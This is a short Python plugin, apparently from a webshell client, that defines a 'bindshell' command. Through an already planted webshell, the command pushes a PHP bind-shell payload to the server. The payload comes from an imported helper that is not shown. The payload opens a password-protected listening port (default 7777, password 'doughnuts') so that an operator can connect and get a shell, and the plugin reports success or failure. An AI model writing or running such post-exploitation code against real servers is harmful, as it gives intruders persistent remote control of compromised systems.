from libs.config import alias, color
from libs.myapp import send
from libs.functions.webshell_plugins.bindshell import *
from threading import Thread
from time import sleep


@alias(True, func_alias="bs", _type="SHELL")
def run(port: int = 7777, passwd: str = "doughnuts"):
    """
    bind shell

    Bind a port and wait for someone to connect to get a shell.

    eg: bindshell {port=7777} {passwd=doughnuts}
    """
    t = Thread(target=send, args=(get_php_binshell(str(port), passwd), ))
    t.setDaemon(True)
    t.start()
    sleep(1)
    if (t.is_alive()):
        print(
            f"\nBind {port} {color.green('success')}. Password is {color.green(passwd)}\n")
    else:
        print(f"\nBind {port} {color.red('error')}\n")
